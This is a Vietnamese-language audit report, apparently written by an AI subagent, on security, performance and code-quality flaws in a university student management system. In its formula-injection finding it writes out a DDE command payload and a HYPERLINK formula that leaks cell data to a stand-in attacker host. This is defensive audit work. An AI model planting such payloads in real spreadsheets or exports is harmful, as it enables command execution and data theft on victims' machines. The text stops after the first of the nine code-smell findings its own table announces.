# BÁO CÁO TOÀN DIỆN KHẢO SÁT AN NINH BẢO MẬT, HIỆU NĂNG & CHẤT LƯỢNG MÃ NGUỒN
**Dự án:** Student Management System (SMS / DoAnChuyenNganh)  
**Thư mục làm việc:** `c:\Users\Public\Learn Phenikaa\Nam4\Ky1\DoAnChuyenNganh`  
**Đơn vị thực hiện:** Security & Clean Code Explorer Subagent  
**Thời điểm khảo sát:** 2026-10-08T17:20:00Z  

---

## I. TỔNG QUAN KHẢO SÁT (EXECUTIVE SUMMARY)

Sau quá trình điều tra toàn diện mã nguồn tầng Backend (Java 23, Spring Boot, Spring Security, JPA/Hibernate, Apache POI), Frontend (React 19, Vite, Zustand, Nginx), CSDL (MySQL 8.0, Triggers, Views) và hạ tầng Docker/Config, chúng tôi đã phát hiện **22 vấn đề trọng yếu** được phân loại cụ thể như sau:

| Nhóm danh mục | Tổng số phát hiện | Critical | High | Medium | Low |
| :--- | :---: | :---: | :---: | :---: | :---: |
| **1. An ninh & Lỗ hổng bảo mật (Security Vulnerabilities)** | 7 | 0 | 2 | 4 | 1 |
| **2. Điểm nghẽn hiệu năng (Performance Bottlenecks)** | 6 | 1 | 0 | 5 | 0 |
| **3. Code Smells & Bad Practices** | 9 | 0 | 1 | 2 | 6 |
| **TỔNG CỘNG** | **22** | **1** | **3** | **11** | **7** |

---

## II. CHI TIẾT CÁC PHÁT HIỆN BẢO MẬT (SECURITY VULNERABILITIES)

### SEC-01: HTML Injection / Email XSS & Nguy cơ Open Spam Relay trong Dịch vụ Gửi Email
- **Đường dẫn tương đối:** `backend/src/main/java/com/sms/service/EmailService.java:45-114, 137-154` và `backend/src/main/java/com/sms/service/PasswordResetService.java:233-238`
- **Đường dẫn tuyệt đối:** `c:\Users\Public\Learn Phenikaa\Nam4\Ky1\DoAnChuyenNganh\backend\src\main\java\com\sms\service\EmailService.java` và `c:\Users\Public\Learn Phenikaa\Nam4\Ky1\DoAnChuyenNganh\backend\src\main\java\com\sms\service\PasswordResetService.java`
- **Dòng vi phạm:** 
  - `EmailService.java:45-114`: HTML formatted email cấp lại mật khẩu
  - `EmailService.java:137-154`: HTML formatted email từ chối yêu cầu
  - `PasswordResetService.java:234`: `request.getEmail()`
- **Phân loại:** Security Vulnerability
- **Mức độ nghiêm trọng:** High
- **Mô tả & Dẫn chứng:**
  Trong `EmailService.java`, email được sinh bằng cách nội suy chuỗi HTML dạng Text Block (`"""...""".formatted(fullName, ...)` và `"""...""".formatted(fullName, username, reason)`), sau đó thiết lập chế độ render HTML qua `helper.setText(htmlContent, true)`. Các trường `fullName`, `username` và `reason` được nhúng trực tiếp mà không qua bất kỳ hàm mã hoá HTML (HTML entity encoding) nào.
  Đồng thời, tại `PasswordResetService.java:234`, khi Admin từ chối yêu cầu, hệ thống gửi email trực tiếp tới `request.getEmail()`, vốn là email do người dùng nhập từ endpoint công khai `/api/auth/forgot-password` (không yêu cầu đăng nhập hay xác minh trước).
- **Rủi ro & Tác động:**
  1. Kẻ tấn công có thể gửi yêu cầu đặt lại mật khẩu với họ tên hoặc lý do chứa mã HTML độc hại (`<a href="phishing">`, `<iframe>`, các payload HTML/CSS lừa đảo). Khi nạn nhân hoặc quản trị viên nhận email, email client hỗ trợ webmail sẽ render HTML độc hại.
  2. Kẻ tấn công lợi dụng endpoint công khai để spam địa chỉ email của nạn nhân kèm nội dung tùy biến, biến hệ thống thành máy chủ phát tán thư rác (Open Email Relay / Spam Bounce), dẫn tới việc domain và IP SMTP của trường bị đưa vào blacklist email toàn cầu.
- **Biện pháp khắc phục (Actionable Recommendation):**
  1. Sử dụng `org.springframework.web.util.HtmlUtils.htmlEscape(...)` hoặc thư viện OWASP Java Encoder để encode toàn bộ các biến động trước khi nhúng vào mẫu HTML email.
  2. Khi từ chối yêu cầu cấp lại mật khẩu, chỉ gửi email tới địa chỉ đã lưu trong hồ sơ hệ thống (`onFileEmail`) tương tự như hàm `approveRequest`, hoặc yêu cầu xác thực reCAPTCHA ở form công khai để chống bot spam.

---

### SEC-02: Cấu hình CORS quá nới lỏng với Wildcard Subdomain và `allowCredentials(true)`
- **Đường dẫn tương đối:** `backend/src/main/resources/application.properties:55` và `backend/src/main/java/com/sms/config/SecurityConfig.java:100-117`
- **Đường dẫn tuyệt đối:** `c:\Users\Public\Learn Phenikaa\Nam4\Ky1\DoAnChuyenNganh\backend\src\main\resources\application.properties` và `c:\Users\Public\Learn Phenikaa\Nam4\Ky1\DoAnChuyenNganh\backend\src\main\java\com\sms\config\SecurityConfig.java`
- **Dòng vi phạm:** 
  - `application.properties:55`
  - `SecurityConfig.java:104-113`
- **Phân loại:** Security Vulnerability
- **Mức độ nghiêm trọng:** High
- **Mô tả & Dẫn chứng:**
  Tại `application.properties:55`:
  ```properties
  app.cors.allowed-origins=${CORS_ALLOWED_ORIGINS:http://localhost:5173,http://localhost:3000,http://127.0.0.1:5173,http://192.168.1.130:5173,https://*.trycloudflare.com,https://*.github.io}
  ```
  Tại `SecurityConfig.java`:
  ```java
  config.setAllowedOriginPatterns(origins);
  ...
  config.setAllowCredentials(true);
  ```
  `allowedOriginPatterns` cho phép ký tự đại diện `*` kết hợp cùng `allowCredentials(true)`. Tuy nhiên, các domain `https://*.trycloudflare.com` và `https://*.github.io` là các nền tảng public multi-tenant miễn phí (bất kỳ ai trên Internet đều có thể tạo một trang tại `attacker.github.io` hoặc mở Cloudflare Tunnel tạm thời).
- **Rủi ro & Tác động:**
  Một trang web độc hại lưu trữ tại `attacker.github.io` hoặc `evil.trycloudflare.com` có thể gửi yêu cầu AJAX có đính kèm cookie/thông tin xác thực của người dùng tới API của hệ thống SMS và đọc được dữ liệu phản hồi, vi phạm nghiêm trọng chính sách Same-Origin Policy.
- **Biện pháp khắc phục (Actionable Recommendation):**
  1. Loại bỏ hoàn toàn các wildcard public domain (`https://*.trycloudflare.com`, `https://*.github.io`) khỏi cấu hình mặc định trong môi trường production.
  2. Chỉ cho phép các domain chính xác và thuộc quyền quản lý của nhà trường (ví dụ: `https://sms.phenikaa-uni.edu.vn`).

---

### SEC-03: Lỗ hổng CSV / Formula Injection trong Chức năng Xuất Dữ liệu
- **Đường dẫn tương đối:** `frontend/src/utils/export.js:1-16` và `backend/src/main/java/com/sms/service/ExcelExportService.java:170-179`
- **Đường dẫn tuyệt đối:** `c:\Users\Public\Learn Phenikaa\Nam4\Ky1\DoAnChuyenNganh\frontend\src\utils\export.js` và `c:\Users\Public\Learn Phenikaa\Nam4\Ky1\DoAnChuyenNganh\backend\src\main\java\com\sms\service\ExcelExportService.java`
- **Dòng vi phạm:**
  - `export.js:2`: `const escape = (value) => `"${String(value ?? '').replaceAll('"', '""')}"`;`
  - `ExcelExportService.java:171,176`: ghi trực tiếp mã SV và họ tên vào Cell kiểu String
- **Phân loại:** Security Vulnerability
- **Mức độ nghiêm trọng:** Medium
- **Mô tả & Dẫn chứng:**
  Trong `export.js`, hàm xuất CSV chỉ thực hiện bọc dấu ngoặc kép và thay thế `"` thành `""`. Nếu dữ liệu (tên sinh viên, mã sinh viên, lý do cảnh báo, ghi chú) bắt đầu bằng các ký tự công thức của bảng tính như `=`, `+`, `-`, `@`, `\t`, `\r`, các phần mềm như Microsoft Excel hoặc LibreOffice Calc sẽ tự động thực thi công thức đó khi mở file.
  Tương tự trong `ExcelExportService.java:176`, họ tên sinh viên được gán trực tiếp vào cell mà không được kiểm tra tiền tố công thức.
- **Rủi ro & Tác động:**
  Kẻ tấn công có thể đặt tên sinh viên hoặc thông tin cá nhân dưới dạng payload DDE formula (ví dụ: `=cmd|'/C calc'!A0` hoặc `=HYPERLINK("http://attacker.com/leak?data="&A1, "Click")`). Khi cán bộ phòng đào tạo hoặc giảng viên tải file danh sách điểm về mở trên máy tính, mã độc có thể được kích hoạt và thực thi lệnh tùy ý trên máy nạn nhân.
- **Biện pháp khắc phục (Actionable Recommendation):**
  Thêm hàm làm sạch công thức: Nếu giá trị chuỗi bắt đầu bằng bất kỳ ký tự nào trong tập `['=', '+', '-', '@', '\t', '\r']`, hãy chèn một dấu nháy đơn `'` ở đầu chuỗi (ví dụ: `val = "'" + val`) để ép phần mềm bảng tính hiển thị dưới dạng văn bản thuần túy.

---

### SEC-04: Token JWT Stateless Không Đồng Bộ Vòng Đời Tài Khoản (Bypass Thu Hồi Token)
- **Đường dẫn tương đối:** `backend/src/main/java/com/sms/security/JwtAuthFilter.java:54-63` và `backend/src/main/java/com/sms/security/UserPrincipal.java:43-56`
- **Đường dẫn tuyệt đối:** `c:\Users\Public\Learn Phenikaa\Nam4\Ky1\DoAnChuyenNganh\backend\src\main\java\com\sms\security\JwtAuthFilter.java` và `c:\Users\Public\Learn Phenikaa\Nam4\Ky1\DoAnChuyenNganh\backend\src\main\java\com\sms\security\UserPrincipal.java`
- **Dòng vi phạm:**
  - `JwtAuthFilter.java:56`: `UserPrincipal userPrincipal = UserPrincipal.createFromClaims(claims);`
  - `UserPrincipal.java:52-53`:
    ```java
    true, // Giả định token còn hạn thì active
    false, // Không có thông tin này trong JWT
    ```
- **Phân loại:** Security Vulnerability
- **Mức độ nghiêm trọng:** Medium
- **Mô tả & Dẫn chứng:**
  Bộ lọc xác thực `JwtAuthFilter` khởi tạo `UserPrincipal` hoàn toàn dựa trên các trường có sẵn trong Claims của JWT mà không truy vấn CSDL hay kiểm tra trạng thái kích hoạt tài khoản (`isActive`). Thuộc tính `active` luôn được gán cứng là `true`.
  Đồng thời, đối tượng `UserDetailsServiceImpl` được inject vào `JwtAuthFilter` (dòng 25) nhưng hoàn toàn không được gọi (dead code).
- **Rủi ro & Tác động:**
  Khi một tài khoản sinh viên bị đình chỉ học vụ (`status = SUSPENDED`, `user.setIsActive(false)`), hoặc tài khoản bị quản trị viên khóa hay đổi mật khẩu, người dùng đó vẫn có thể tiếp tục sử dụng token đã được cấp trước đó để truy cập và thực hiện các tác vụ trong hệ thống cho đến khi token hết hạn (mặc định 24 giờ).
- **Biện pháp khắc phục (Actionable Recommendation):**
  1. Thêm kiểm tra trạng thái tài khoản vào `JwtAuthFilter` (có thể lưu trạng thái `active` và `tokenVersion` trong bộ nhớ đệm Redis hoặc Caffeine để không làm chậm hiệu năng).
  2. Bổ sung cơ chế thu hồi token (Token Blacklist / Token Revocation) khi người dùng đổi mật khẩu hoặc bị vô hiệu hóa tài khoản.

---

### SEC-05: Thông Tin Đăng Nhập CSDL Mặc Định & Mật Khẩu Rỗng Trong Cấu Hình
- **Đường dẫn tương đối:** `backend/src/main/resources/application.properties:11-12` và `docker-compose.yml:9, 35-36`
- **Đường dẫn tuyệt đối:** `c:\Users\Public\Learn Phenikaa\Nam4\Ky1\DoAnChuyenNganh\backend\src\main\resources\application.properties` và `c:\Users\Public\Learn Phenikaa\Nam4\Ky1\DoAnChuyenNganh\docker-compose.yml`
- **Dòng vi phạm:**
  - `application.properties:11-12`:
    ```properties
    spring.datasource.username=root
    spring.datasource.password=
    ```
  - `docker-compose.yml:9`: `MYSQL_ALLOW_EMPTY_PASSWORD: 'yes'`
  - `docker-compose.yml:35-36`: `SPRING_DATASOURCE_USERNAME: root`, `SPRING_DATASOURCE_PASSWORD: ""`
- **Phân loại:** Security Vulnerability / Bad Practice
- **Mức độ nghiêm trọng:** Medium
- **Mô tả & Dẫn chứng:**
  File cấu hình `application.properties` gán cứng tài khoản CSDL là `root` với mật khẩu trống mà không sử dụng cú pháp tham số hóa biến môi trường (`${SPRING_DATASOURCE_USERNAME:root}`, `${SPRING_DATASOURCE_PASSWORD:}`). File `docker-compose.yml` bật cấu hình cho phép mật khẩu rỗng và mở port `3308:3306` ra bên ngoài máy host.
- **Rủi ro & Tác động:**
  Nếu vô tình triển khai cấu hình này lên máy chủ thật, CSDL sẽ bị truy cập tự do mà không cần mật khẩu. Ngoài ra, việc lưu trữ mật khẩu mặc định trong kho mã nguồn vi phạm nguyên tắc bảo mật thông tin đăng nhập của OWASP.
- **Biện pháp khắc phục (Actionable Recommendation):**
  1. Chuyển đổi thành biến môi trường có giá trị fallback an toàn:
     ```properties
     spring.datasource.username=${SPRING_DATASOURCE_USERNAME:sms_user}
     spring.datasource.password=${SPRING_DATASOURCE_PASSWORD:change_me_in_prod}
     ```
  2. Xóa bỏ `MYSQL_ALLOW_EMPTY_PASSWORD: 'yes'` trong `docker-compose.yml` và thiết lập `MYSQL_ROOT_PASSWORD` cùng một tài khoản phi root cho ứng dụng.

---

### SEC-06: Nguy cơ Lỗi NullPointerException & Truy Cập Không Kiểm Soát tại `/api/auth/change-password`
- **Đường dẫn tương đối:** `backend/src/main/java/com/sms/config/SecurityConfig.java:45` và `backend/src/main/java/com/sms/controller/AuthController.java:35-41`
- **Đường dẫn tuyệt đối:** `c:\Users\Public\Learn Phenikaa\Nam4\Ky1\DoAnChuyenNganh\backend\src\main\java\com\sms\config\SecurityConfig.java` và `c:\Users\Public\Learn Phenikaa\Nam4\Ky1\DoAnChuyenNganh\backend\src\main\java\com\sms\controller\AuthController.java`
- **Dòng vi phạm:**
  - `SecurityConfig.java:45`: `.requestMatchers("/api/auth/**").permitAll()`
  - `AuthController.java:35-41`:
    ```java
    @PutMapping("/change-password")
    public ResponseEntity<ApiResponse<Void>> changePassword(
            @AuthenticationPrincipal UserPrincipal user,
            @Valid @RequestBody ChangePasswordRequest request) {
        authService.changePassword(user.getId(), request);
        return ResponseEntity.ok(ApiResponse.success("Đổi mật khẩu thành công"));
    }
    ```
- **Phân loại:** Security Vulnerability / Code Smell
- **Mức độ nghiêm trọng:** Medium
- **Mô tả & Dẫn chứng:**
  Trong `SecurityConfig.java`, quy tắc bảo mật thiết lập mở tự do toàn bộ nhánh `/api/auth/**` (`permitAll()`). Tuy nhiên, endpoint `/api/auth/change-password` lại là phương thức thay đổi mật khẩu của người dùng hiện tại và yêu cầu `@AuthenticationPrincipal UserPrincipal user`.
  Nếu một request PUT được gửi tới `/api/auth/change-password` mà không có header `Authorization`, Spring Security vẫn cho phép request đi qua; lúc này biến `user` mang giá trị `null`, dẫn đến việc gọi `user.getId()` gây ra `NullPointerException` (mã lỗi HTTP 500).
- **Rủi ro & Tác động:**
  Gây crash luồng xử lý bằng lỗi 500 không mong muốn; thiếu bảo vệ phân quyền rõ ràng ở tầng filter chain cho một tác vụ quản lý tài khoản nhạy cảm.
- **Biện pháp khắc phục (Actionable Recommendation):**
  1. Thêm annotation `@PreAuthorize("isAuthenticated()")` trên phương thức `changePassword` trong `AuthController.java`.
  2. Hoặc cấu hình rõ ràng trong `SecurityConfig.java`:
     ```java
     .requestMatchers("/api/auth/login", "/api/auth/forgot-password", "/api/auth/logout").permitAll()
     .requestMatchers("/api/auth/change-password").authenticated()
     ```

---

### SEC-07: Thiếu Header Bảo Mật & Lộ Tài Liệu API Swagger/OpenAPI Công Khai
- **Đường dẫn tương đối:** `frontend/nginx.conf:20-43`
- **Đường dẫn tuyệt đối:** `c:\Users\Public\Learn Phenikaa\Nam4\Ky1\DoAnChuyenNganh\frontend\nginx.conf`
- **Dòng vi phạm:** `nginx.conf:36-43`
- **Phân loại:** Security Vulnerability / Configuration Flaw
- **Mức độ nghiêm trọng:** Low
- **Mô tả & Dẫn chứng:**
  File cấu hình Nginx thiếu toàn bộ các HTTP Security Headers tiêu chuẩn của OWASP (`X-Frame-Options`, `X-Content-Type-Options`, `Content-Security-Policy`, `Referrer-Policy`, `Permissions-Policy`).
  Ngoài ra, Nginx cấu hình proxy trực tiếp `/swagger-ui/` và `/v3/api-docs` ra ngoài internet công khai mà không có bất kỳ rào cản IP whitelist hay xác thực nào.
- **Rủi ro & Tác động:**
  Thiếu header chống clickjacking (`X-Frame-Options`) cho phép kẻ tấn công nhúng trang web vào `<iframe>` độc hại. Việc công khai tài liệu API chi tiết giúp kẻ tấn công dễ dàng thu thập sơ đồ endpoint, cấu trúc request/response để phục vụ cho các đợt rà quét lỗ hổng có mục tiêu.
- **Biện pháp khắc phục (Actionable Recommendation):**
  Thêm cấu hình bảo mật vào block server của `nginx.conf`:
  ```nginx
  add_header X-Frame-Options "SAMEORIGIN" always;
  add_header X-Content-Type-Options "nosniff" always;
  add_header Referrer-Policy "strict-origin-when-cross-origin" always;
  add_header Content-Security-Policy "default-src 'self'; style-src 'self' 'unsafe-inline'; script-src 'self'; img-src 'self' data: https:;" always;
  ```
  Đóng hoặc giới hạn quyền truy cập Swagger trong môi trường production.

---

## III. CHI TIẾT CÁC PHÁT HIỆN HIỆU NĂNG (PERFORMANCE BOTTLENECKS)

### PERF-01: Thảm Họa N+1 Database Queries & Quá Tải Bộ Nhớ trong API Cảnh Báo Học Vụ
- **Đường dẫn tương đối:** `backend/src/main/java/com/sms/controller/AcademicWarningController.java:33-45` và `backend/src/main/java/com/sms/service/TranscriptService.java:48-53`
- **Đường dẫn tuyệt đối:** `c:\Users\Public\Learn Phenikaa\Nam4\Ky1\DoAnChuyenNganh\backend\src\main\java\com\sms\controller\AcademicWarningController.java` và `c:\Users\Public\Learn Phenikaa\Nam4\Ky1\DoAnChuyenNganh\backend\src\main\java\com\sms\service\TranscriptService.java`
- **Dòng vi phạm:** `AcademicWarningController.java:33-45`
  ```java
  List<AcademicWarningResponse> warnings = studentService.findAll().stream()
          .filter(student -> majorId == null
                  || (student.getClassEntity() != null && student.getClassEntity().getMajor() != null
                  && majorId.equals(student.getClassEntity().getMajor().getId())))
          .map(student -> transcriptService.getTranscript(student.getId()))
          .filter(transcript -> transcript.getWarningLevel() > 0)
          .filter(transcript -> level == null || transcript.getWarningLevel() == level)
          .map(transcript -> toWarningResponse(transcript, semesterId))
          .filter(response -> response != null)
          .sorted(Comparator.comparing(AcademicWarningResponse::getWarningLevel).reversed()
                  .thenComparing(AcademicWarningResponse::getStudentCode))
          .toList();
  ```
- **Phân loại:** Performance Bottleneck
- **Mức độ nghiêm trọng:** Critical
- **Mô tả & Dẫn chứng:**
  Để lấy danh sách sinh viên bị cảnh báo học vụ, Controller thực hiện gọi `studentService.findAll()`, tải **toàn bộ sinh viên trong CSDL** vào bộ nhớ Java. Sau đó, với **từng sinh viên một**, hàm tiếp tục gọi `transcriptService.getTranscript(student.getId())`.
  Bên trong `TranscriptService.getTranscript`, hệ thống thực thi tiếp:
  - 1 query `studentRepository.findById(studentId)`
  - 1 query `gradeRepository.findFinalizedByStudentId(studentId)`
  Như vậy, nếu trường có 2.000 sinh viên, một HTTP request duy nhất tới `/api/academic-warnings` sẽ thực thi tới hơn **4.001 câu lệnh SQL**, khởi tạo hàng chục ngàn đối tượng Java trên Heap và serialize toàn bộ danh sách khổng lồ này về client mà không có phân trang.
- **Rủi ro & Tác động:**
  Hệ thống sẽ bị đơ, nghẽn hàng đợi kết nối của HikariCP Connection Pool, gây Spike CPU 100% trên cả MySQL Server và JVM, dẫn đến Crash OutOfMemoryError khi lượng sinh viên thực tế tăng lên.
- **Biện pháp khắc phục (Actionable Recommendation):**
  1. Loại bỏ xử lý duyệt stream toàn bộ sinh viên ở tầng Application.
  2. Tận dụng view có sẵn trong CSDL (`v_student_gpa` hoặc viết câu truy vấn gom nhóm trực tiếp bằng JPQL/SQL Native) để lọc các sinh viên có CPA dưới ngưỡng cảnh báo ($< 2.0$, $< 1.5$) ngay tại tầng CSDL.
  3. Bổ sung tham số phân trang `Pageable` để chỉ tải 20 hoặc 50 bản ghi mỗi trang.

---

### PERF-02: Lệch Chuẩn Hợp Đồng API (API Contract Mismatch) & Hỏng Phân Trang Cảnh Báo Học Vụ
- **Đường dẫn tương đối:** `frontend/src/pages/admin/AcademicWarningsPage.jsx:32-39` vs `backend/src/main/java/com/sms/controller/AcademicWarningController.java:27-32`
- **Đường dẫn tuyệt đối:** `c:\Users\Public\Learn Phenikaa\Nam4\Ky1\DoAnChuyenNganh\frontend\src\pages\admin\AcademicWarningsPage.jsx` và `c:\Users\Public\Learn Phenikaa\Nam4\Ky1\DoAnChuyenNganh\backend\src\main\java\com\sms\controller\AcademicWarningController.java`
- **Dòng vi phạm:**
  - `AcademicWarningsPage.jsx:32`: `const params = { page, size: pageSize };`
  - `AcademicWarningsPage.jsx:38-39`:
    ```javascript
    setWarnings(response.data?.data || response.data?.content || []);
    setTotalPages(response.data?.totalPages || 1);
    ```
  - `AcademicWarningController.java:29-32`: Phương thức chỉ nhận `semesterId`, `level`, `majorId`, trả về `ApiResponse<List<AcademicWarningResponse>>`
- **Phân loại:** Performance Bottleneck / Code Defect
- **Mức độ nghiêm trọng:** Medium
- **Mô tả & Dẫn chứng:**
  Frontend gửi lên tham số phân trang `{ page, size: 20 }` và kỳ vọng Backend trả về đối tượng `Page` (`totalPages`, `content`). Tuy nhiên Backend hoàn toàn bỏ qua `page` và `size`, luôn trả về một List mảng toàn bộ dữ liệu. Khi đó, `response.data.totalPages` luôn là `undefined`, biến `totalPages` trên UI luôn bằng 1, khiến người dùng không thể chuyển trang thực tế và trình duyệt luôn phải render toàn bộ mảng dữ liệu.
- **Rủi ro & Tác động:**
  Lãng phí băng thông truyền tải dữ liệu, giao diện người dùng hiển thị không chính xác trạng thái phân trang, gây chậm trễ tải trang cho phía Admin.
- **Biện pháp khắc phục (Actionable Recommendation):**
  Đồng bộ hợp đồng API: Thêm `Pageable pageable` vào `AcademicWarningController` và trả về `Page<AcademicWarningResponse>`.

---

### PERF-03: Nguy Cơ Rò Rỉ Bộ Nhớ (Memory Leak / DoS) tại `LoginAttemptService` Do Map Không Có TTL
- **Đường dẫn tương đối:** `backend/src/main/java/com/sms/service/LoginAttemptService.java:22, 48`
- **Đường dẫn tuyệt đối:** `c:\Users\Public\Learn Phenikaa\Nam4\Ky1\DoAnChuyenNganh\backend\src\main\java\com\sms\service\LoginAttemptService.java`
- **Dòng vi phạm:**
  - `LoginAttemptService.java:22`: `private final ConcurrentHashMap<String, AttemptInfo> attempts = new ConcurrentHashMap<>();`
  - `LoginAttemptService.java:48`: `attempts.put(key, new AttemptInfo(newCount, newLock));`
- **Phân loại:** Performance Bottleneck / Denial of Service
- **Mức độ nghiêm trọng:** Medium
- **Mô tả & Dẫn chứng:**
  `LoginAttemptService` lưu trữ số lần đăng nhập sai của các tài khoản vào một `ConcurrentHashMap` trong bộ nhớ. Tuy nhiên, class này **không có bất kỳ cơ chế dọn dẹp định kỳ (cleanup), eviction policy hay giới hạn kích thước tối đa (max size)** nào (trái ngược với `RateLimitFilter` có hàm `cleanupExpiredBuckets` dọn dẹp mỗi 5 phút).
- **Rủi ro & Tác động:**
  Nếu kẻ tấn công gửi hàng triệu request đăng nhập với các username ngẫu nhiên khác nhau, mỗi username sẽ tạo ra một entry vĩnh viễn trong RAM và không bao giờ bị giải phóng, dẫn tới cạn kiệt bộ nhớ JVM Heap và gây lỗi `OutOfMemoryError: Java heap space`.
- **Biện pháp khắc phục (Actionable Recommendation):**
  Thay thế `ConcurrentHashMap` bằng Caffeine Cache hoặc Guava Cache với cấu hình kích thước tối đa và thời gian hết hạn:
  ```java
  Cache<String, AttemptInfo> attempts = Caffeine.newBuilder()
          .expireAfterWrite(15, TimeUnit.MINUTES)
          .maximumSize(20_000)
          .build();
  ```

---

### PERF-04: Truy Vấn Lặp Dư Thừa & Mô Hình Ghi Từng Bản Ghi (N+1 Insert) trong `SpecialClassService`
- **Đường dẫn tương đối:** `backend/src/main/java/com/sms/service/SpecialClassService.java:113, 124-138`
- **Đường dẫn tuyệt đối:** `c:\Users\Public\Learn Phenikaa\Nam4\Ky1\DoAnChuyenNganh\backend\src\main\java\com\sms\service\SpecialClassService.java`
- **Dòng vi phạm:** `SpecialClassService.java:113, 124, 128, 136`
- **Phân loại:** Performance Bottleneck / Bad Practice
- **Mức độ nghiêm trọng:** Medium
- **Mô tả & Dẫn chứng:**
  Trong hàm `finalizeBilling`:
  1. Dòng 113 gọi: `int count = enrollmentRepository.findActiveBySectionId(sectionId).size();`
  2. Ngay sau đó tại dòng 124 lại gọi tiếp: `for (Enrollment enrollment : enrollmentRepository.findActiveBySectionId(sectionId))` (thực thi câu lệnh SQL tìm danh sách đăng ký 2 lần liên tiếp).
  3. Bên trong vòng lặp duyệt từng sinh viên, hệ thống lại gọi `invoiceRepository.existsByStudentIdAndSectionId(...)` và `invoiceRepository.save(invoice)` cho từng sinh viên một cách tuần tự.
- **Rủi ro & Tác động:**
  Tạo ra số lượng query dư thừa $2N + 2$ cho mỗi lần chốt lớp riêng, gây chậm trễ thời gian phản hồi API và tăng tải không cần thiết lên database.
- **Biện pháp khắc phục (Actionable Recommendation):**
  1. Lưu danh sách `List<Enrollment> enrollments` vào biến cục bộ để tái sử dụng một lần duy nhất.
  2. Gom các đối tượng `StudentInvoice` vào danh sách và lưu một lần bằng `invoiceRepository.saveAll(invoices)`.

---

### PERF-05: Vòng Lặp Truy Vấn N+1 Lồng Nhau trong `CurriculumService`
- **Đường dẫn tương đối:** `backend/src/main/java/com/sms/service/CurriculumService.java:51-72`
- **Đường dẫn tuyệt đối:** `c:\Users\Public\Learn Phenikaa\Nam4\Ky1\DoAnChuyenNganh\backend\src\main\java\com\sms\service\CurriculumService.java`
- **Dòng vi phạm:** `CurriculumService.java:51-54, 70`
- **Phân loại:** Performance Bottleneck
- **Mức độ nghiêm trọng:** Medium
- **Mô tả & Dẫn chứng:**
  Khi sinh viên tra cứu khung chương trình đào tạo tại `getMyCurriculum`:
  ```java
  for (CurriculumBlock block : blockRepository.findByProgramIdOrdered(program.getId())) {
      ...
      for (CurriculumBlockSubject link : blockSubjectRepository.findByBlockIdWithSubject(block.getId())) {
          ...
          subject.getPrerequisites().stream()...
  ```
  Với mỗi khối kiến thức ($B$ khối), hệ thống thực thi 1 query tìm danh sách môn học. Tiếp theo, với mỗi môn học ($S$ môn), hệ thống lại kích hoạt lazy loading truy vấn bảng `subject_prerequisites`.
- **Rủi ro & Tác động:**
  Phát sinh $1 + B + S$ câu lệnh SQL cho mỗi lần sinh viên mở trang "Chương trình đào tạo", gây trễ mạng và chậm hiển thị trang lộ trình học tập.
- **Biện pháp khắc phục (Actionable Recommendation):**
  Sử dụng câu truy vấn nạp trước toàn bộ (Fetch Join hoặc `@EntityGraph`) các khối kiến thức cùng môn học và môn tiên quyết theo `programId` trong một lần truy vấn duy nhất.

---

### PERF-06: Re-render Toàn Bộ Bảng Nhập Điểm Khi Giảng Viên Gõ Phím
- **Đường dẫn tương đối:** `frontend/src/pages/lecturer/GradeEntryPage.jsx:69-77`
- **Đường dẫn tuyệt đối:** `c:\Users\Public\Learn Phenikaa\Nam4\Ky1\DoAnChuyenNganh\frontend\src\pages\lecturer\GradeEntryPage.jsx`
- **Dòng vi phạm:** `GradeEntryPage.jsx:69-77`
  ```javascript
  const handleScoreChange = (index, field, value) => {
    const val = value === "" ? "" : parseFloat(value);
    const updated = [...grades];
    updated[index] = {
      ...updated[index],
      [field]: val,
    };
    setGrades(updated);
  };
  ```
- **Phân loại:** Performance Bottleneck
- **Mức độ nghiêm trọng:** Medium
- **Mô tả & Dẫn chứng:**
  Trong trang vào điểm của giảng viên, mỗi thao tác gõ 1 ký tự vào bất kỳ ô điểm nào (CC1, CC2, GK, CK) đều kích hoạt `handleScoreChange`, sao chép toàn bộ mảng `grades` và gọi `setGrades`. Vì toàn bộ các hàng trong bảng (`tr`) được render trực tiếp trong component cha mà không được bọc qua `React.memo`, mỗi thao tác nhập liệu của 1 sinh viên sẽ ép toàn bộ 50 - 100 hàng sinh viên khác phải re-render lại toàn bộ DOM.
- **Rủi ro & Tác động:**
  Giao diện bị giật lag, độ trễ phản hồi bàn phím (input latency) cao khi lớp học phần có sĩ số lớn (70 - 100 sinh viên), làm giảm đáng kể trải nghiệm người dùng của giảng viên.
- **Biện pháp khắc phục (Actionable Recommendation):**
  Tách mỗi dòng điểm của sinh viên thành một component riêng biệt `GradeRow` và bọc bằng `React.memo(...)`, chỉ truyền các callback được ghi nhớ (`useCallback`) để chỉ dòng có điểm thay đổi mới re-render.

---

## IV. CHI TIẾT CÁC PHÁT HIỆN CODE SMELLS & BAD PRACTICES

### SMELL-01: Nguy Cơ Văng Lỗi `NullPointerException` Do Quên Kiểm Tra Null Trong `GradeService` và `CourseSectionService`
- **Đường dẫn tương đối:** `backend/src/main/java/com/sms/service/GradeService.java:228-231` và `backend/src/main/java/com/sms/service/CourseSectionService.java:157-160`
- **Đường dẫn tuyệt đối:** `c:\Users\Public\Learn Phenikaa\Nam4\Ky1\DoAnChuyenNganh\backend\src\main\java\com\sms\service\GradeService.java` và `c:\Users\Public\Learn Phenikaa\Nam4\Ky1\DoAnChuyenNganh\backend\src\main\java\com\sms\service\CourseSectionService.java`
- **Dòng vi phạm:**
  - `GradeService.java:228-231`:
    ```java
    if (lecturer != null) {
        CourseSection section = enrollment.getSection();
        if (!section.getLecturer().getId().equals(lecturer.getId())) {
    ```
  - `CourseSectionService.java:157`:
    ```java
    if (!scheduleRepository.findLecturerConflicts(section.getLecturer().getId(), ...
    ```
- **Phân loại:** Code Smell / Bug Risk
- **Mức độ nghiêm trọng:** High
- **Mô tả & Dẫn chứng:**
  Tại dòng 72 của `GradeService.java`, tác giả đã viết đúng:
  ```java
  if (section.getLecturer() == null || !section.getLecturer().getId().equals(lecturer.getId()))
  ```
  Nhưng ở hàm `applyScores` (dòng 229), tác giả lại gọi trực tiếp `section.getLecturer().getId()` mà không kiểm tra `section.getLecturer() == null`.
  Tương tự trong `CourseSectionService.java:157`, khi cập nhật lịch cho lớp học phần, `section.getLecturer().getId()` được gọi mà không kiểm tra xem lớp học phần đó đã được phân công giảng viên hay chưa.
- **Rủi ro & Tác động:**
  Nếu một lớp học phần chưa được gán giảng viên hoặc bản ghi dữ liệu có `lecturer_id` null, thao tác cập nhật điểm hoặc xếp lịch sẽ văng lỗi `NullPointerException` (HTTP 500) và làm gián đoạn nghiệp vụ.
